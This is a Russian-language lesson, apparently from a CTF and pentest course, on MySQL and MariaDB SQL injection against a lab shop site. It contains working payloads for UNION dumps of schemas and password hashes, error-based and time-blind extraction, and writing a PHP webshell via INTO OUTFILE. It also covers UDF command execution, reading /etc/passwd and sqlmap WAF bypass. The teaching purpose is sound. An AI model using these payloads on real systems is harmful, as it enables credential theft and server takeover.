---
id: db-mysql
title: "MySQL и MariaDB: инъекции на практике — от дампа до UDF-RCE"
category: web
parent: web-sqli-dbms-open
difficulty: medium
order: 1
tags: [sqli, mysql, mariadb, union, outfile, udf, information_schema, sqlmap]
prerequisites: [web-sqli, web-sqli-dbms]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "MySQL/MariaDB от фингерпринта до RCE: information_schema, error-based, time-blind, INTO OUTFILE, UDF, general_log и sqlmap."
lab:
  kind: shell
  title: 'Практика: MySQL — от кавычки до дампа схемы'
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: 'grep -q ''nto{'' found.txt'
  hints:
    - 'Проверь диалект: `curl -s "http://shop.local/product?id=7''"` — в тексте ошибки есть MySQL.'
    - 'Считай колонки: сравни размер ответа на `ORDER BY 1..3` и `ORDER BY 4` (`... | wc -c`).'
    - 'Список таблиц: UNION с `GROUP_CONCAT(table_name)` из `information_schema.tables`.'
    - 'Флаг лежит в таблице `secrets` — дампни её через UNION и запиши флаг в `found.txt`.'
---

## Задача

MySQL и MariaDB — самая частая база за веб-приложениями: на них работают WordPress, Laravel, Bitrix и большинство PHP-сайтов. Если ты нашёл инъекцию и база оказалась MySQL, тебе доступно почти всё: быстрый дамп через UNION, error-based, слепое чтение по времени, чтение и запись файлов и даже RCE. Этот урок проведёт нас по всему пути — от одной кавычки до выполнения команды на сервере.

## Данные, с которыми работаем

Цель — `https://shop.local/product?id=7` (PHP + MySQL). Обычный запрос отдаёт страницу товара.

Начнём с кавычки. Признаки MySQL в ошибке: `You have an error in your SQL syntax` и упоминание `MySQL server version`.

```bash
$ curl -s "https://shop.local/product?id=7%27" | grep -o 'You have an error[^<]*'
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
```

Диалект подтверждён. Заодно запомни комментарий MySQL: `-- ` **обязательно с пробелом** (в URL `--%20`), иначе запрос не закомментируется; альтернатива — `#` (`%23`).

## Шаг 1: сколько колонок

Считаем колонки через `ORDER BY`:

```bash
$ for n in 1 2 3 4; do printf '%s ' "$n"; curl -s "https://shop.local/product?id=7 ORDER BY $n-- -" | wc -c; done
1 4210
2 4210
3 4210
4 89
```

На `4` размер ответа рухнул — запрос упал, значит, колонок **три**. Теперь `UNION SELECT` должен вернуть ровно три значения.

## Шаг 2: что отражается в ответе

Подставим маркеры и посмотрим, какая колонка попадает на страницу:

```bash
$ curl -s "https://shop.local/product?id=-1 UNION SELECT 111,222,333-- -" | grep -oE '>[0-9]{3}<'
>222<
```

`id=-1` даёт пустой результат, поэтому в ответ попадает только наш UNION. Отражается **вторая** колонка — в неё и будем класть данные.

## Шаг 3: дампим схему через information_schema

`information_schema` — это стандартный каталог метаданных, который MySQL поддерживает. Нас интересуют таблицы `TABLES` (список таблиц) и `COLUMNS` (список колонок). Соберём все таблицы текущей базы в одну строку функцией `GROUP_CONCAT`:

```bash
$ curl -s "https://shop.local/product?id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -" | grep -oE '>[^<]*users[^<]*<'
>users,products,orders<
```

Три таблицы. Смотрим колонки `users`:

```bash
$ curl -s "https://shop.local/product?id=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -"
>id,username,password,email<
```

## Шаг 4: дампим пароли

Собираем пары логин:пароль. `0x3a` — это `:` в hex, `0x0a` — перевод строки; hex удобен, когда кавычки фильтруются:

```bash
$ curl -s "https://shop.local/product?id=-1 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3 FROM users-- -"
>admin:$2y$10$hQ...bcrypt
john:5f4dcc3b5aa765d61d8327deb882cf99<
```

Первый хэш — bcrypt (медленный, перебирается тяжело), второй — MD5 от `password` (ломается мгновенно). Доказательство получено: реальные учётки из базы.

## Шаг 5: error-based, когда UNION не выводится

Иногда колонки не отражаются. Если приложение **показывает текст ошибки**, данные можно вытащить прямо в ней — это **error-based**. В MySQL два классических вектора: `extractvalue()` и `updatexml()`, оба печатают свой аргумент в тексте ошибки:

```bash
$ curl -s "https://shop.local/product?id=1 AND extractvalue(1,concat(0x7e,database(),0x7e))-- -"
XPATH syntax error: '~appdb~'
```

`0x7e` — это `~`, маркер границы, чтобы было видно, где начинается и кончается значение. Лимит вывода — около 32 символов, поэтому длинные данные бьют по частям через `SUBSTRING` или `LIMIT offset,1`.

## Шаг 6: time-blind, когда не видно ничего

Если ответы не отличаются вообще, остаётся время. `SLEEP(5)` задерживает ответ на 5 секунд — и по этим секундам мы узнаём, что наше условие истинно:

```bash
$ time curl -s -o /dev/null "https://shop.local/product?id=1 AND SLEEP(5)-- -"
real    0m5.03s
```

Осторожно: это **слепой** канал, на каждый символ уходит по запросу. Если `SLEEP` фильтруется, используют `BENCHMARK(5000000,MD5(0x41))` — тяжёлую функцию, которая тоже «висит».

## Шаг 7: файлы и RCE

Проверим, разрешена ли запись файлов. `@@secure_file_priv` показывает, в какой каталог это позволено; пустая строка означает «без ограничений»:

```bash
$ curl -s "https://shop.local/product?id=-1 UNION SELECT 1,@@secure_file_priv,@@version-- -" | grep -oE '>[^<]*<'
><
>8.0.36<
```

Пусто — писать можно куда угодно (если у пользователя есть право `FILE`). Запишем webshell. Payload — это `<?php system($_GET["c"]); ?>`, закодированный в hex, чтобы обойти фильтры кавычек:

```bash
$ curl -s "https://shop.local/product?id=-1 UNION SELECT 1,0x3c3f7068702073797374656d28245f4745545b2263225d293b203f3e,3 INTO OUTFILE '/var/www/html/s.php'-- -"
```

И проверим:

```bash
$ curl -s "https://shop.local/s.php?c=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**RCE получен.** `INTO OUTFILE` создаёт новый файл (существующий не перезаписывает), `INTO DUMPFILE` пишет байт-в-байт — им заливают бинарники. Ещё два пути к RCE: **UDF** (залить `lib_mysqludf_sys.so` в `@@plugin_dir`, затем `CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so'` и `SELECT sys_exec('id')`) и подмена **`general_log`** на PHP-файл в веб-корне.

## Полный прогон от начала до конца

1. `id=7'` → `You have an error in your SQL syntax` — MySQL, инъекция есть.
2. `ORDER BY 4` ломается → три колонки.
3. `UNION SELECT 111,222,333` → отражается вторая колонка.
4. `information_schema.tables` → `users,products,orders`.
5. `GROUP_CONCAT(username,0x3a,password)` → реальные хэши.
6. `@@secure_file_priv` пуст → пишем `s.php` через `INTO OUTFILE`.
7. `s.php?c=id` → `uid=33(www-data)` — RCE.

## Если не сработало

- **`--` не комментирует.** Нужен пробел: `-- -` или `#` (`%23`).
- **Файлы не пишутся.** Проверь `@@secure_file_priv` (если задан — только его каталог) и право `FILE` у пользователя.
- **`information_schema` фильтруется.** В MariaDB 10+ есть обход через `mysql.innodb_table_stats`.
- **Кавычки режутся.** Используй hex-строки (`0x...`) вместо `'...'`.
- **sqlmap.** Когда ручная работа утомляет: `sqlmap -r request.txt -p id --batch --dbms=mysql --dbs`, а для обхода WAF — `--tamper=space2comment,between,charencode`.

## Сводная шпаргалка MySQL

| Задача | Payload |
|--------|---------|
| Версия / пользователь | `@@version`, `user()`, `database()` |
| Список баз | `SELECT schema_name FROM information_schema.schemata` |
| Таблицы базы | `SELECT table_name FROM information_schema.tables WHERE table_schema=database()` |
| Колонки | `SELECT column_name FROM information_schema.columns WHERE table_name='users'` |
| В одну строку | `GROUP_CONCAT(col SEPARATOR 0x0a)` |
| Error-based | `extractvalue(1,concat(0x7e,<данные>,0x7e))` |
| Time-blind | `IF(<условие>,SLEEP(5),0)` |
| Чтение файла | `LOAD_FILE('/etc/passwd')` |
| Запись файла | `SELECT 0x... INTO OUTFILE '/var/www/html/s.php'` |
| Каталог плагинов | `@@plugin_dir` |

## На что смотреть дальше

- **`--` без пробела — не комментарий.** Это самая частая ошибка новичка в MySQL.
- **`OUTFILE` ≠ `DUMPFILE`.** Первый экранирует и разделяет строки, второй пишет сырые байты.
- **`secure_file_priv` решает всё.** Не проверив его, не рассчитывай на файловые операции.
- **Право `FILE` обязательно** — обычный пользователь без него файлы не читает.
- **UDF заметен и рискован.** Создание `sys_exec` меняет сервер; на проде — только с согласования.
- **MariaDB — почти MySQL**, но версию проверяй: от неё зависят доступные функции.

## Квиз

Проверь себя.

```quiz
- question: "Как в MySQL закомментировать остаток запроса?"
  options:
    - "--без пробела"
    - "-- с пробелом (-- ) или #"
    - "//"
    - "%%"
  answer: 1
  explanation: "В MySQL два дефиса обязаны сопровождаться пробелом/переводом строки; иначе это не комментарий."
- question: "Что вернёт `extractvalue(1,concat(0x7e,database(),0x7e))`?"
  options:
    - "Ничего"
    - "Имя текущей базы в тексте ошибки XPATH"
    - "Список таблиц"
    - "Версию"
  answer: 1
  explanation: "extractvalue печатает аргумент в тексте ошибки — это error-based канал."
- question: "Где в MySQL лежит список таблиц?"
  options:
    - "sqlite_master"
    - "information_schema.tables"
    - "all_tables"
    - "sys.objects"
  answer: 1
  explanation: "information_schema — стандартный каталог метаданных MySQL."
- question: "Какая настройка ограничивает, куда можно писать файлы?"
  options:
    - "@@datadir"
    - "@@secure_file_priv"
    - "@@sql_mode"
    - "@@hostname"
  answer: 1
  explanation: "Пустое значение = без ограничений; иначе файловые функции работают только в указанном каталоге."
- question: "Что нужно, чтобы `LOAD_FILE`/`INTO OUTFILE` сработали?"
  options:
    - "Только валидный SQL"
    - "Право FILE у пользователя и разрешающий secure_file_priv"
    - "Права root"
    - "Отключённый TLS"
  answer: 1
  explanation: "Без права FILE и вне каталога secure_file_priv файловые операции запрещены."
```

## Куда дальше

Следующий урок (`db-sqlite`) разберёт SQLite — базу без сервера, которую ты встретишь в мобильных и десктопных приложениях. Там нет ни `information_schema`, ни `SLEEP`, зато есть `sqlite_master` и `ATTACH DATABASE`. А пока главное запомни: MySQL даёт полный набор — от UNION-дампа до записи webshell; проверяй `secure_file_priv` и право `FILE`, прежде чем рассчитывать на RCE.

## Где пригодится

- **CTF (Web):** MySQL — самая частая база в задачах; UNION-дамп и `INTO OUTFILE` — классика.
- **Bug bounty:** дамп учёток и запись webshell превращают SQLi в critical.
- **Пентест:** отчёт с точным диалектом и рабочим PoC ценится выше скана.
- **Работа (AppSec):** параметризация запросов, минимум прав у DB-пользователя, `secure_file_priv` — ключевые меры.
